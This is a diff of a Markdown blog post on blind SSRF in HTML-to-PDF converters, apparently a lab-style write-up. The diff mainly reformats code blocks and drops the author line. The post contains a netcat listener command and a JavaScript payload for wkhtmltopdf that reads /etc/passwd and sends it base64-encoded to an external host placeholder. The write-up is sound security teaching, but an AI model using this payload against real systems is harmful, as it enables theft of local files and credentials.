@@ -1,7 +1,6 @@
 ---
 title: "Exploring Blind SSRF Vulnerabilities in HTML to PDF Conversion Applications"
-date: 2023-04-23
-author: 0xLuc4s
+date: 2023-04-23 19:08:00
 categories: [ssrf-vulnerabilies]
 tags: [ssrf]
 ---
@@ -18,14 +17,14 @@ The target application listens on port 8080 and accepts HTML files for processin
 
 To test for blind SSRF, we employed an external server setup to capture any outbound requests from the application. The test involved submitting an HTML file containing a reference to an image hosted on our external server:
 
-```html
-<!DOCTYPE html>
-<html>
-<body>
-    <h1>Hello World!</h1>
-    <img src="http://<EXTERNAL SERVICE IP>:9090/test-image">
-</body>
-</html>
+    <!DOCTYPE html>
+    <html>
+    <body>
+        <h1>Hello World!</h1>
+        <img src="http://<EXTERNAL SERVICE IP>:9090/test-image">
+    </body>
+    </html>
+
 
 ## Simplifying SSRF Blind Testing with Netcat
 
@@ -35,9 +34,9 @@ For our testing purposes, we employ a simple Netcat listener running on a virtua
 
 Here's the command to set up the Netcat listener, crucial for our SSRF testing:
 
-\```bash
-sudo nc -nlvp 9090
-\```
+  
+    sudo nc -nlvp 9090
+   
 
 This command configures Netcat to listen on all interfaces at port 9090, ready to log any incoming requests.
 
@@ -49,27 +48,27 @@ Upon submitting an HTML file containing external resource references, the applic
 
 Further exploration reveals that the application's PDF conversion tool, wkhtmltopdf, supports JavaScript execution within HTML files. We exploit this feature to perform data exfiltration as demonstrated below:
 
-\```html
-<html>
-<body>
-    <script>
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "file:///etc/passwd", true);
-    xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4 && xhr.status === 200) {
-            // Encode the file contents in base64
-            var b64content = btoa(xhr.responseText);
-            // Send the encoded data to our external server
-            var exfil = new XMLHttpRequest();
-            exfil.open("GET", "http://<EXTERNAL SERVICE IP>:9090/exfil?data=" + b64content, true);
-            exfil.send();
-        }
-    };
-    xhr.send();
-    </script>
-</body>
-</html>
-\```
+    
+    <html>
+    <body>
+        <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "file:///etc/passwd", true);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                // Encode the file contents in base64
+                var b64content = btoa(xhr.responseText);
+                // Send the encoded data to our external server
+                var exfil = new XMLHttpRequest();
+                exfil.open("GET", "http://<EXTERNAL SERVICE IP>:9090/exfil?data=" + b64content, true);
+                exfil.send();
+            }
+        };
+        xhr.send();
+        </script>
+    </body>
+    </html>
+    
 
 This script reads the local `/etc/passwd` file and sends its Base64-encoded contents to our Netcat listener, showcasing a direct method of exploiting the SSRF vulnerability to extract sensitive information.
 
